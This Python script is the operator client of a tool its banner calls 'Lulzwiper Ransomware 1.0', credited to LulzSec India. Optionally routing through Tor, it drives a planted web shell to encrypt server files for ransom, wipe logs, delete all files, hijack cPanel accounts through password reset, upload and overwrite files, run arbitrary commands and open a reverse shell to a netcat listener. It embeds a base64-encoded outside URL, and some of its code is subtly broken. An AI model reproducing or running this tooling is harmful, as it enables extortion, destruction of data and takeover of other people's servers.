import sys
import os
try:
    import requests
except:
    os.system("python -m pip install requests")
try:
    from torrequest import TorRequest
except:
    os.system("python -m pip install torrequest")
try:
    from urllib.parse import urlparse
except ImportError:
     from urlparse import urlparse
import time
import webbrowser
import base64

os.system("clear")
print("""

        [49m[K[0m

        [45C[48;5;16m        [49m
        [35C[48;5;16m                            [49m
        [30C[48;5;16m           [48;5;59m                [48;5;16m           [49m
        [26C[48;5;16m        [48;5;59m   [48;5;145m [48;5;59m  [48;5;53m [48;5;59m   [48;5;17m [48;5;231m [48;5;59m [48;5;188m [48;5;59m [48;5;188m [48;5;66m [48;5;102m [48;5;59m            [48;5;16m        [49m
        [23C[48;5;16m       [48;5;59m  [48;5;145m [48;5;59m  [48;5;231m [48;5;59m  [48;5;231m [48;5;59m [48;5;145m [48;5;59m  [48;5;145m [48;5;102m [48;5;188m [48;5;59m [48;5;188m [48;5;59m  [48;5;102m [48;5;59m [48;5;188m [48;5;59m [48;5;231m [48;5;188m [48;5;231m [48;5;188m [48;5;145m [48;5;188m  [48;5;59m [48;5;53m [48;5;59m     [48;5;16m       [49m
        [21C[48;5;16m      [48;5;59m [48;5;103m [48;5;59m       [48;5;145m [48;5;231m [48;5;59m     [48;5;101m [48;5;180m         [48;5;138m [48;5;101m [48;5;59m      [48;5;23m [48;5;231m [48;5;59m        [48;5;16m      [49m
        [19C[48;5;16m     [48;5;59m            [48;5;95m [48;5;180m [48;5;131m [48;5;95m   [48;5;131m             [48;5;95m    [48;5;137m [48;5;180m [48;5;59m             [48;5;16m     [49m
        [17C[48;5;16m     [48;5;59m [48;5;145m [48;5;59m        [48;5;137m [48;5;138m [48;5;95m  [48;5;131m    [48;5;173m               [48;5;137m      [48;5;131m [48;5;95m  [48;5;180m [48;5;95m [48;5;59m          [48;5;16m     [49m
        [15C[48;5;16m     [48;5;59m [48;5;145m [48;5;59m       [48;5;95m [48;5;180m [48;5;95m [48;5;131m  [48;5;137m [48;5;173m      [48;5;179m  [48;5;180m [48;5;179m               [48;5;173m  [48;5;137m    [48;5;131m [48;5;95m [48;5;180m [48;5;59m          [48;5;16m     [49m
        [14C[48;5;16m    [48;5;59m [48;5;60m [48;5;59m       [48;5;181m [48;5;131m   [48;5;137m [48;5;173m  [48;5;179m [48;5;180m    [48;5;216m [48;5;222m  [48;5;223m [48;5;144m [48;5;59m  [48;5;223m [48;5;222m     [48;5;186m [48;5;180m    [48;5;179m        [48;5;137m   [48;5;131m [48;5;95m [48;5;138m [48;5;59m        [48;5;16m     [49m
        [13C[48;5;16m    [48;5;59m [48;5;102m [48;5;59m      [48;5;180m [48;5;131m  [48;5;137m  [48;5;173m [48;5;180m    [48;5;186m [48;5;222m [48;5;223m [48;5;145m [48;5;59m        [48;5;187m [48;5;223m  [48;5;222m     [48;5;216m [48;5;222m   [48;5;186m [48;5;180m      [48;5;179m  [48;5;137m   [48;5;95m [48;5;138m [48;5;59m        [48;5;16m    [49m
        [12C[48;5;16m    [48;5;59m [48;5;17m [48;5;59m     [48;5;101m [48;5;95m  [48;5;131m [48;5;137m [48;5;173m [48;5;180m   [48;5;187m [48;5;223m [48;5;187m [48;5;59m             [48;5;223m     [48;5;222m        [48;5;186m     [48;5;180m   [48;5;143m [48;5;137m  [48;5;101m [48;5;137m [48;5;59m        [48;5;16m    [49m
        [11C[48;5;16m   [48;5;59m  [48;5;138m [48;5;102m [48;5;211m [48;5;23m [48;5;59m  [48;5;180m [48;5;95m [48;5;131m [48;5;137m  [48;5;180m   [48;5;187m  [48;5;59m                 [48;5;230m [48;5;224m [48;5;223m           [48;5;222m [48;5;223m [48;5;187m   [48;5;186m [48;5;180m   [48;5;144m [48;5;138m [48;5;137m [48;5;101m [48;5;180m [48;5;59m  [48;5;181m [48;5;187m [48;5;196m [48;5;59m  [48;5;16m    [49m
        [10C[48;5;16m    [48;5;59m   [48;5;202m [48;5;203m [48;5;109m [48;5;59m [48;5;181m [48;5;95m [48;5;137m  [48;5;174m [48;5;180m  [48;5;187m   [48;5;223m [48;5;59m                  [48;5;224m    [48;5;223m            [48;5;187m    [48;5;181m [48;5;180m [48;5;144m [48;5;138m [48;5;137m [48;5;101m [48;5;187m [48;5;59m [48;5;203m  [48;5;167m [48;5;144m [48;5;23m [48;5;59m [48;5;16m    [49m
        [9C[48;5;16m    [48;5;59m [48;5;23m [48;5;59m     [48;5;180m [48;5;95m [48;5;137m [48;5;138m  [48;5;180m [48;5;181m [48;5;187m  [48;5;223m [48;5;224m    [48;5;59m                 [48;5;230m  [48;5;188m [48;5;16m     [48;5;145m [48;5;223m        [48;5;187m    [48;5;180m [48;5;144m [48;5;138m [48;5;137m [48;5;101m [48;5;186m [48;5;59m   [48;5;23m   [48;5;59m [48;5;16m    [49m
        [9C[48;5;16m   [48;5;59m [48;5;60m [48;5;181m [48;5;203m  [48;5;53m [48;5;59m [48;5;187m [48;5;95m [48;5;137m [48;5;138m  [48;5;180m [48;5;181m  [48;5;187m [48;5;188m [48;5;224m     [48;5;230m [48;5;59m           [48;5;66m [48;5;59m     [48;5;16m [48;5;17m [48;5;16m [48;5;145m [48;5;224m             [48;5;188m  [48;5;187m  [48;5;181m [48;5;144m [48;5;138m [48;5;137m [48;5;95m [48;5;138m [48;5;59m  [48;5;210m [48;5;167m [48;5;174m [48;5;59m [48;5;60m [48;5;16m   [49m
        [8C[48;5;16m    [48;5;59m   [48;5;211m [48;5;59m  [48;5;137m [48;5;95m [48;5;101m [48;5;138m  [48;5;181m   [48;5;188m  [48;5;224m    [48;5;230m    [48;5;59m     [48;5;102m [48;5;60m [48;5;59m         [48;5;23m [48;5;103m [48;5;230m     [48;5;224m          [48;5;188m    [48;5;187m [48;5;181m [48;5;145m [48;5;144m [48;5;138m [48;5;95m [48;5;59m  [48;5;102m [48;5;59m [48;5;23m [48;5;59m  [48;5;16m    [49m
        [8C[48;5;16m   [48;5;60m [48;5;59m   [48;5;217m [48;5;59m  [48;5;137m [48;5;101m [48;5;138m  [48;5;145m [48;5;181m  [48;5;188m   [48;5;224m     [48;5;230m   [48;5;231m [48;5;59m         [48;5;188m  [48;5;102m [48;5;231m [48;5;230m [48;5;231m  [48;5;230m [48;5;231m [48;5;16m [48;5;230m    [48;5;224m         [48;5;188m     [48;5;187m [48;5;181m [48;5;145m [48;5;138m [48;5;102m [48;5;181m [48;5;59m   [48;5;23m [48;5;66m [48;5;59m [48;5;16m    [49m
        [8C[48;5;16m   [48;5;59m  [48;5;145m [48;5;167m [48;5;197m [48;5;211m [48;5;101m [48;5;95m [48;5;101m [48;5;138m [48;5;144m [48;5;181m  [48;5;188m   [48;5;224m      [48;5;139m [48;5;16m [48;5;17m  [48;5;53m [48;5;59m    [48;5;231m   [48;5;16m [48;5;231m   [48;5;59m [48;5;188m  [48;5;59m [48;5;17m [48;5;188m [48;5;230m [48;5;59m [48;5;230m    [48;5;224m     [48;5;230m  [48;5;224m [48;5;230m [48;5;188m     [48;5;181m [48;5;145m [48;5;144m [48;5;138m [48;5;95m [48;5;59m  [48;5;167m [48;5;197m [48;5;166m [48;5;181m [48;5;59m [48;5;16m   [49m
        [7C[48;5;16m    [48;5;59m      [48;5;181m [48;5;101m [48;5;138m  [48;5;145m [48;5;181m [48;5;187m [48;5;188m    [48;5;224m   [48;5;16m   [48;5;59m [48;5;231m  [48;5;17m [48;5;59m [48;5;231m  [48;5;102m  [48;5;188m  [48;5;109m [48;5;188m [48;5;231m  [48;5;102m [48;5;231m   [48;5;23m [48;5;231m [48;5;230m [48;5;145m [48;5;188m [48;5;230m  [48;5;16m [48;5;230m  [48;5;224m      [48;5;230m  [48;5;188m    [48;5;187m [48;5;181m [48;5;144m [48;5;138m [48;5;101m [48;5;138m [48;5;59m   [48;5;23m [48;5;59m  [48;5;16m    [49m
        [7C[48;5;16m   [48;5;59m       [48;5;180m [48;5;101m [48;5;138m [48;5;144m [48;5;145m [48;5;181m [48;5;187m [48;5;188m   [48;5;224m  [48;5;230m  [48;5;224m   [48;5;230m  [48;5;188m [48;5;16m [48;5;188m  [48;5;17m [48;5;102m [48;5;188m  [48;5;152m [48;5;188m [48;5;59m [48;5;230m   [48;5;102m [48;5;66m [48;5;195m [48;5;16m  [48;5;59m [48;5;188m [48;5;16m   [48;5;102m [48;5;230m [48;5;224m  [48;5;230m [48;5;23m [48;5;16m   [48;5;230m  [48;5;188m    [48;5;187m [48;5;181m [48;5;145m [48;5;138m [48;5;102m [48;5;180m [48;5;59m      [48;5;16m    [49m
        [7C[48;5;16m   [48;5;59m       [48;5;180m [48;5;95m [48;5;138m  [48;5;144m [48;5;181m  [48;5;187m [48;5;188m   [48;5;224m        [48;5;188m [48;5;16m [48;5;230m [48;5;145m [48;5;188m [48;5;152m  [48;5;145m [48;5;152m [48;5;66m [48;5;59m [48;5;230m [48;5;16m  [48;5;230m [48;5;145m [48;5;16m [48;5;188m  [48;5;102m [48;5;230m [48;5;59m [48;5;230m [48;5;224m    [48;5;230m  [48;5;59m [48;5;194m  [48;5;102m [48;5;230m  [48;5;188m    [48;5;187m [48;5;181m [48;5;144m [48;5;138m [48;5;101m [48;5;180m [48;5;59m      [48;5;16m    [49m
        [7C[48;5;16m   [48;5;59m       [48;5;181m [48;5;95m [48;5;138m  [48;5;144m [48;5;181m  [48;5;187m  [48;5;188m       [48;5;224m   [48;5;188m [48;5;16m [48;5;224m [48;5;17m [48;5;224m [48;5;230m [48;5;188m [48;5;102m [48;5;145m [48;5;230m [48;5;224m [48;5;59m [48;5;16m [48;5;230m [48;5;16m [48;5;188m  [48;5;102m [48;5;224m [48;5;102m [48;5;187m [48;5;145m [48;5;224m     [48;5;194m  [48;5;16m    [48;5;194m [48;5;188m    [48;5;187m [48;5;181m [48;5;145m [48;5;144m [48;5;138m [48;5;101m [48;5;137m [48;5;59m      [48;5;16m   [49m
        [7C[48;5;16m    [48;5;59m      [48;5;101m [48;5;95m [48;5;137m [48;5;138m  [48;5;180m [48;5;181m  [48;5;187m           [48;5;188m [48;5;16m [48;5;188m [48;5;102m [48;5;188m [48;5;224m [48;5;188m [48;5;224m  [48;5;188m [48;5;101m [48;5;188m  [48;5;230m      [48;5;224m [48;5;16m [48;5;188m      [48;5;194m   [48;5;16m [48;5;188m [48;5;194m  [48;5;188m  [48;5;187m   [48;5;181m [48;5;144m  [48;5;138m [48;5;95m [48;5;59m      [48;5;60m [48;5;16m   [49m
        [8C[48;5;16m   [48;5;102m [48;5;59m      [48;5;101m [48;5;95m [48;5;137m [48;5;138m [48;5;144m [48;5;180m  [48;5;187m            [48;5;101m [48;5;16m [48;5;145m [48;5;187m      [48;5;223m  [48;5;187m [48;5;188m    [48;5;187m [48;5;194m [48;5;16m [48;5;194m  [48;5;187m    [48;5;188m [48;5;187m [48;5;16m [48;5;144m [48;5;59m [48;5;144m [48;5;188m   [48;5;187m   [48;5;186m [48;5;144m  [48;5;138m [48;5;101m [48;5;181m [48;5;59m       [48;5;16m   [49m
        [8C[48;5;16m    [48;5;59m      [48;5;138m [48;5;95m [48;5;101m [48;5;137m [48;5;144m  [48;5;180m [48;5;186m  [48;5;187m            [48;5;16m [48;5;22m [48;5;187m           [48;5;188m [48;5;16m [48;5;59m [48;5;187m        [48;5;101m [48;5;187m  [48;5;145m [48;5;187m       [48;5;144m   [48;5;101m [48;5;95m  [48;5;59m      [48;5;16m    [49m
        [9C[48;5;16m   [48;5;59m       [48;5;187m [48;5;95m [48;5;101m [48;5;137m [48;5;143m [48;5;144m [48;5;180m [48;5;186m              [48;5;187m [48;5;59m [48;5;16m       [48;5;17m  [48;5;16m [48;5;187m [48;5;193m [48;5;17m  [48;5;187m     [48;5;145m [48;5;144m [48;5;187m         [48;5;186m [48;5;144m   [48;5;137m [48;5;101m [48;5;144m [48;5;59m       [48;5;16m   [49m
        [9C[48;5;16m    [48;5;59m   [48;5;102m [48;5;59m   [48;5;138m [48;5;95m [48;5;101m [48;5;137m [48;5;143m [48;5;144m  [48;5;186m                [48;5;17m [48;5;187m [48;5;186m [48;5;59m [48;5;186m [48;5;59m [48;5;16m [48;5;17m [48;5;187m [48;5;146m [48;5;102m [48;5;59m [48;5;17m [48;5;193m [48;5;187m [48;5;16m [48;5;22m [48;5;17m [48;5;186m          [48;5;150m [48;5;144m  [48;5;143m [48;5;137m [48;5;101m [48;5;187m [48;5;59m  [48;5;188m [48;5;231m [48;5;59m   [48;5;16m    [49m
        [10C[48;5;16m    [48;5;59m  [48;5;145m [48;5;231m [48;5;188m [48;5;59m  [48;5;180m [48;5;95m [48;5;101m [48;5;137m  [48;5;143m  [48;5;179m [48;5;186m               [48;5;16m [48;5;187m [48;5;186m [48;5;59m [48;5;187m [48;5;188m [48;5;59m [48;5;23m [48;5;16m [48;5;188m [48;5;59m [48;5;150m [48;5;17m [48;5;186m             [48;5;150m [48;5;144m [48;5;143m  [48;5;101m  [48;5;186m [48;5;59m  [48;5;231m  [48;5;59m   [48;5;16m    [49m
        [11C[48;5;16m   [48;5;59m    [48;5;231m [48;5;59m   [48;5;180m [48;5;95m [48;5;101m  [48;5;143m    [48;5;179m [48;5;185m        [48;5;186m    [48;5;59m [48;5;187m [48;5;17m [48;5;186m  [48;5;59m [48;5;146m [48;5;17m [48;5;108m [48;5;186m [48;5;59m [48;5;146m [48;5;186m [48;5;187m [48;5;59m [48;5;186m    [48;5;185m [48;5;186m   [48;5;185m [48;5;149m [48;5;150m [48;5;149m [48;5;143m  [48;5;107m [48;5;101m [48;5;59m [48;5;180m [48;5;59m   [48;5;145m  [48;5;59m  [48;5;16m    [49m
        [12C[48;5;16m    [48;5;59m   [48;5;23m [48;5;59m   [48;5;101m [48;5;59m [48;5;101m   [48;5;143m   [48;5;149m   [48;5;179m [48;5;143m [48;5;185m      [48;5;186m [48;5;101m [48;5;185m [48;5;22m [48;5;186m   [48;5;187m [48;5;188m [48;5;59m [48;5;186m [48;5;59m  [48;5;186m  [48;5;102m [48;5;186m    [48;5;149m     [48;5;143m   [48;5;107m [48;5;101m  [48;5;95m [48;5;59m   [48;5;188m [48;5;145m [48;5;59m   [48;5;16m    [49m
        [13C[48;5;16m    [48;5;59m  [48;5;53m [48;5;59m     [48;5;181m [48;5;59m [48;5;101m   [48;5;143m    [48;5;149m      [48;5;185m  [48;5;16m [48;5;185m [48;5;101m [48;5;52m [48;5;65m [48;5;53m [48;5;17m [48;5;16m [48;5;144m [48;5;186m  [48;5;187m [48;5;59m [48;5;185m [48;5;186m [48;5;149m [48;5;144m [48;5;150m [48;5;149m   [48;5;150m [48;5;149m  [48;5;143m  [48;5;107m [48;5;101m  [48;5;59m [48;5;137m [48;5;59m   [48;5;145m [48;5;59m    [48;5;16m    [49m
        [14C[48;5;16m    [48;5;59m   [48;5;188m  [48;5;102m [48;5;59m   [48;5;186m [48;5;59m [48;5;101m    [48;5;143m   [48;5;149m      [48;5;101m [48;5;149m [48;5;186m [48;5;23m [48;5;59m [48;5;185m     [48;5;149m [48;5;144m [48;5;149m    [48;5;17m [48;5;149m     [48;5;143m [48;5;107m  [48;5;101m  [48;5;59m [48;5;143m [48;5;59m   [48;5;103m [48;5;145m [48;5;23m [48;5;59m  [48;5;16m     [49m
        [15C[48;5;16m     [48;5;59m     [48;5;145m [48;5;59m   [48;5;95m [48;5;138m [48;5;59m [48;5;101m   [48;5;107m   [48;5;143m   [48;5;149m                  [48;5;143m [48;5;107m    [48;5;101m  [48;5;65m [48;5;144m [48;5;59m    [48;5;188m [48;5;231m [48;5;23m [48;5;17m [48;5;59m  [48;5;16m    [49m
        [17C[48;5;16m     [48;5;59m   [48;5;188m [48;5;59m [48;5;145m [48;5;59m    [48;5;137m [48;5;101m [48;5;59m [48;5;65m [48;5;101m   [48;5;107m      [48;5;143m       [48;5;107m        [48;5;101m  [48;5;65m [48;5;59m [48;5;144m [48;5;95m [48;5;59m      [48;5;231m [48;5;59m   [48;5;16m     [49m
        [19C[48;5;16m     [48;5;59m   [48;5;145m [48;5;188m [48;5;59m [48;5;231m [48;5;59m     [48;5;95m [48;5;187m [48;5;58m [48;5;59m  [48;5;65m [48;5;101m               [48;5;65m [48;5;59m [48;5;101m [48;5;180m [48;5;59m      [48;5;102m [48;5;59m [48;5;231m [48;5;53m [48;5;59m   [48;5;16m     [49m
        [21C[48;5;16m     [48;5;59m     [48;5;102m [48;5;59m  [48;5;231m [48;5;59m       [48;5;95m [48;5;137m [48;5;180m [48;5;187m [48;5;180m [48;5;144m [48;5;138m  [48;5;144m [48;5;186m [48;5;187m [48;5;180m [48;5;101m [48;5;59m         [48;5;102m [48;5;60m [48;5;188m [48;5;59m    [48;5;16m      [49m
        [23C[48;5;16m       [48;5;59m      [48;5;188m  [48;5;231m  [48;5;145m [48;5;103m [48;5;188m [48;5;59m             [48;5;188m [48;5;231m  [48;5;59m [48;5;17m [48;5;102m [48;5;53m [48;5;59m     [48;5;16m      [49m
        [26C[48;5;16m        [48;5;59m          [48;5;103m [48;5;59m  [48;5;23m [48;5;102m [48;5;231m [48;5;59m              [48;5;16m       [49m
        [30C[48;5;16m           [48;5;59m               [48;5;16m            [49m
        [35C[48;5;16m                           [49m


        [0m

                                                                    ..................................................................
                                                                    ../$$................./$$............/$$$$$$......................
                                                                    .| $$................| $$.........../$$__  $$.....................
                                                                    .| $$......./$$   /$$| $$ /$$$$$$$$| $$  \__/../$$$$$$   /$$$$$$$.
                                                                    .| $$......| $$  | $$| $$|____ /$$/|  $$$$$$../$$__  $$ /$$_____/.
                                                                    .| $$......| $$  | $$| $$.../$$$$/..\____  $$| $$$$$$$$| $$.......
                                                                    .| $$......| $$  | $$| $$../$$__/../$$  \ $$||$$_____/.| $$.......
                                                                    .| $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$.
                                                                    .|________/.\______/.|__/|________/.\______/..\_______/.\_______/.
                                                                    .......................//Laughing at your security since 2011! -->
command : 
Encrypt files = cry
Decrypt files = decry                                                                            
upload files = upload                                                                            Lulzwiper Ransomware 1.0
remove log = logfucker                                                                           contact us = https://www.facebook.com/LulzSecIndiaOfficial/
Delete all files = fuckserver                                                                    coded by = script1337  
check if cpanel can be creck = ccheck
creck cpanel =  creckzee   
replace = replace files content
revese shell = backconnect                                                                                                                                                                                                                                                                                       
""")

yz = "aHR0cHM6Ly9sdWx6d2lwZXIuMDAwd2ViaG9zdGFwcC5jb20vc2hvd2Jvb2IucGhw"


#sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=100, cols=200))


sys.stdout.write("Url > ")
url = sys.stdin.readline()
url = url.replace('\n', '')

header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0'
}

sys.stdout.write("Connect over Tor Yes/No > ")
lol = sys.stdin.readline()
if lol.startswith("Y"):
    with TorRequest() as tr:
        s = tr.session
        sys.stdout.write("Enter you password > ")
        auth = sys.stdin.readline()
        payload = {"auth": auth}
        res = s.post(url, payload, headers=header)
        data = res.content.rstrip('\n')
        sys.stdout.write (data)
        while True:
            sys.stdout.write("$")
            cmd = sys.stdin.readline()
            if cmd.startswith('cd '):
                path = cmd[3:]
                payload = {"path": path}
                res = s.post(url, payload, headers=header)
                data = res.content.rstrip('\n')
                sys.stdout.write (data)
            elif cmd.startswith('cry'):
                sys.stdout.write("KEY > ")
                key = sys.stdin.readline()
                sys.stdout.write("DIR > ")
                dir = sys.stdin.readline()
                new = False
                print("This proccess can take sometime so sit back relax...")
                while new == False:
                    try:
                        payload = {"key": key,"dir": dir}
                        res = s.post(url, payload, headers=header)
                        data = res.content.rstrip('\n')
                        if data.startswith("<html><head><title>500 Internal Server Error</title></head><body>"):
                            print("Connection Timeout Trying again...")
                            new = False
                        else:
                            sys.stdout.write (data)
                            new = True
                    except requests.exceptions.ConnectionError:
                        print("Connection closed by server trying again...")
                        payload = {"key": key,"dir": dir}
                        res = s.post(url, payload, headers=header)
                        data = res.content.rstrip('\n')
                        if data.startswith("<html><head><title>500 Internal Server Error</title></head><body>"):
                            print("Connection Timeout Trying again...")
                            new = False
                        else:
                            sys.stdout.write (data)
                            new = True
            elif cmd.startswith('logfucker'):
                payload = {"logfucked": "true"}
                res = s.post(url, payload, headers=header)
                data = res.content.rstrip('\n')
                sys.stdout.write (data)
            elif cmd.startswith('ccheck'):
                u = urlparse(url)
                try:
                    r = s.get(( u.scheme + "://" + u.netloc + ":2083"), allow_redirects=True)
                except:
                    r = s.get(( u.scheme + "://" + u.netloc + ":2082"), allow_redirects=True)
                if "reset-pw" in r.text:
                    payload = {"creckcpanel": "true"}
                    res = s.post(url, payload, headers=header)
                    data = res.content.rstrip('\n')
                    sys.stdout.write (data)
                else:
                    print("Sorry this cpanel cant be crecked!!! ")
            elif cmd.startswith('creckzee'):
                u = urlparse(url)
                sys.stdout.write("Enter you Email > ")
                email = sys.stdin.readline()
                payload = {"creckzee": email}
                res = s.post(url, payload, headers=header)
                data = res.content.rstrip('\n')
                sys.stdout.write (data)
                time.sleep("0.5")
                try:
                    webbrowser.open_new( u.scheme + "://" + u.netloc + ":2083/resetpass?start=1")
                except:
                    webbrowser.open_new( u.scheme + "://" + u.netloc + ":2082/resetpass?start=1")
            elif cmd.startswith('decry'):
                sys.stdout.write("KEY > ")
                key = sys.stdin.readline()
                sys.stdout.write("DIR > ")
                dir = sys.stdin.readline()
                old = False
                print("This proccess can take sometime so sit back relax...")
                while old == False:
                    try:
                        payload = {"dekey": key,"dir": dir}
                        res = s.post(url, payload, headers=header)
                        data = res.content.rstrip('\n')
                        if data.startswith("<html><head><title>500 Internal Server Error</title></head><body>"):
                            print("Connection Timeout Trying again...")
                            old = False
                        else:
                            sys.stdout.write (data)
                            old = True
                    except requests.exceptions.ConnectionError:
                        print("Connection closed by server trying again...")
                        payload = {"dekey": key,"dir": dir}
                        res = s.post(url, payload, headers=header)
                        data = res.content.rstrip('\n')
                        if data.startswith("<html><head><title>500 Internal Server Error</title></head><body>"):
                            print("Connection Timeout Trying again...")
                            old = False
                        else:
                            sys.stdout.write (data)
                            old = True
            elif cmd.startswith('fuckserver'):
                payload = {"fuckedserver": "TRUE"}
                res = s.post(url, payload, headers=header)
                data = res.content.rstrip('\n')
                sys.stdout.write (data)
            elif cmd.startswith('upload'):
                sys.stdout.write("File location > ")
                filetoupload = sys.stdin.readline()
                filetoupload = filetoupload.replace('\n','')
                try:
                    files = {'file': open(filetoupload, 'rb')}
                    r = s.post(url, files=files)
                    data = r.content.rstrip('\n')
                    sys.stdout.write (data)
                except:
                    print("no such file found ! plz try again :( ")
            elif cmd.startswith('replace'):
                sys.stdout.write("Enter the file path > ")
                path = sys.stdin.readline()
                sys.stdout.write("Enter the content > ")
                content = sys.stdin.readline()
                payload = {"replace": "true", "path":path,"content":content}
                res = s.post(url, payload, headers=header)
                data = res.content.rstrip('\n')
                sys.stdout.write (data)
            elif cmd.startswith('backconnect'):
                sys.stdout.write("Enter your IP > ")
                ip = sys.stdin.readline()
                sys.stdout.write("Enter the port > ")
                port = sys.stdin.readline()
                sys.stdout.write("If your are using ngrok enter your localhost port your forwarded > ")
                localport = sys.stdin.readline()
                payload = {"backconnect": "true", "ip":ip,"port":port}
                print("Tyoe this command is other terminal > nc -lnvp "+localport)
                res = s.post(url, payload, headers=header)
                sys.stdout.write ("reverse shell closed")
            else:
                try:
                    payload = {"zx": cmd}
                    res = s.post(url, payload, headers=header)
                    data = res.content.rstrip('\n')
                    sys.stdout.write (data)
                except:
                    payload = {"zx": cmd}
                    res = s.post(url, payload, headers=header)
                    data = res.content.rstrip('\n')
                    sys.stdout.write (data)



else:
    s = requests.session()
    sys.stdout.write("Enter you password > ")
    auth = sys.stdin.readline()
    payload = {"auth": auth}
    res = s.post(url, payload, headers=header)
    data = res.content.rstrip('\n')
    sys.stdout.write (data)
    while True:
        sys.stdout.write("$")
        cmd = sys.stdin.readline()
        if cmd.startswith('cd '):
            path = cmd[3:]
            payload = {"path": path}
            res = s.post(url, payload, headers=header)
            data = res.content.rstrip('\n')
            sys.stdout.write (data)
        elif cmd.startswith('cry'):
            sys.stdout.write("KEY > ")
            key = sys.stdin.readline()
            sys.stdout.write("DIR > ")
            dir = sys.stdin.readline()
            new = False
            print("This proccess can take sometime so sit back and relax!!!")
            while new == False:
                try:
                    payload = {"key": key,"dir": dir}
                    res = s.post(url, payload, headers=header)
                    data = res.content.rstrip('\n')
                    if data.startswith("<html><head><title>500 Internal Server Error</title></head><body>"):
                        print("Connection Timeout Trying again...")
                        new = False
                    else:
                        sys.stdout.write (data)
                        new = True
                except:
                    print("Connection closed by server trying again...")
                    payload = {"key": key,"dir": dir}
                    res = s.post(url, payload, headers=header)
                    data = res.content.rstrip('\n')
                    if data.startswith("<html><head><title>500 Internal Server Error</title></head><body>"):
                        print("Connection Timeout Trying again...")
                        new = False
                    else:
                        sys.stdout.write (data)
                        new = True
        elif cmd.startswith('logfucker'):
            payload = {"logfucked": "true"}
            res = s.post(url, payload, headers=header)
            data = res.content.rstrip('\n')
            sys.stdout.write (data)
        elif cmd.startswith('ccheck'):
            u = urlparse(url)
            try:
                r = s.get(( u.scheme + "://" + u.netloc + ":2083"), allow_redirects=True)
            except:
                r = s.get(( u.scheme + "://" + u.netloc + ":2082"), allow_redirects=True)
            if "reset-pw" in r.text:
                payload = {"creckcpanel": "true"}
                res = s.post(url, payload, headers=header)
                data = res.content.rstrip('\n')
                sys.stdout.write (data)
            else:
                print("Sorry this cpanel cant be crecked!!! ")
        elif cmd.startswith('creckzee'):
            u = urlparse(url)
            sys.stdout.write("Enter you Email > ")
            email = sys.stdin.readline()
            payload = {"creckzee": email}
            res = s.post(url, payload, headers=header)
            data = res.content.rstrip('\n')
            sys.stdout.write (data)
            time.sleep(0.5)
            try:
                webbrowser.open_new( u.scheme + "://" + u.netloc + ":2083/resetpass?start=1")
            except:
                webbrowser.open_new( u.scheme + "://" + u.netloc + ":2082/resetpass?start=1")
        elif cmd.startswith('decry'):
            sys.stdout.write("KEY > ")
            key = sys.stdin.readline()
            sys.stdout.write("DIR > ")
            dir = sys.stdin.readline()
            old = False
            print("This proccess can take sometime so sit back and relax!!!")
            while old == False:
                try:
                    payload = {"dekey": key,"dir": dir}
                    res = s.post(url, payload, headers=header)
                    data = res.content.rstrip('\n')
                    if data.startswith("<html><head><title>500 Internal Server Error</title></head><body>"):
                        print("Connection Timeout Trying again...")
                        old = False
                    else:
                        sys.stdout.write (data)
                        old = True
                except:
                    print("Connection closed by server trying again...")
                    payload = {"dekey": key,"dir": dir}
                    res = s.post(url, payload, headers=header)
                    data = res.content.rstrip('\n')
                    if data.startswith("<html><head><title>500 Internal Server Error</title></head><body>"):
                        print("Connection Timeout Trying again...")
                        new = False
                    else:
                        sys.stdout.write (data)
                        new = True
        elif cmd.startswith('fuckserver'):
            payload = {"fuckedserver": "TRUE"}
            res = s.post(url, payload, headers=header)
            data = res.content.rstrip('\n')
            sys.stdout.write (data)
        elif cmd.startswith('upload'):
            sys.stdout.write("File location > ")
            filetoupload = sys.stdin.readline()
            filetoupload = filetoupload.replace('\n','')
            try:
                files = {'file': open(filetoupload, 'rb')}
                r = s.post(url, files=files)
                data = r.content.rstrip('\n')
                sys.stdout.write (data)
            except:
                print("no such file found ! plz try again :( ")
        elif cmd.startswith('replace'):
            sys.stdout.write("Enter the file path > ")
            path = sys.stdin.readline()
            sys.stdout.write("Enter the content > ")
            content = sys.stdin.readline()
            payload = {"replace": "true", "path":path,"content":content}
            res = s.post(url, payload, headers=header)
            data = res.content.rstrip('\n')
            sys.stdout.write (data)
        elif cmd.startswith('backconnect'):
            sys.stdout.write("Enter your IP > ")
            ip = sys.stdin.readline()
            sys.stdout.write("Enter the port > ")
            port = sys.stdin.readline()
            sys.stdout.write("If your are using ngrok enter your localhost port your forwarded > ")
            localport = sys.stdin.readline()
            payload = {"backconnect": "true", "ip":ip,"port":port}
            print("Tyoe this command is other terminal > nc -lnvp "+localport)
            res = s.post(url, payload, headers=header)
            sys.stdout.write ("reverse shell closed")
        else:
            try:
                payload = {"zx": cmd}
                res = s.post(url, payload, headers=header)
                data = res.content.rstrip('\n')
                sys.stdout.write (data)
            except:
                payload = {"zx": cmd}
                res = s.post(url, payload, headers=header)
                data = res.content.rstrip('\n')
                sys.stdout.write (data)
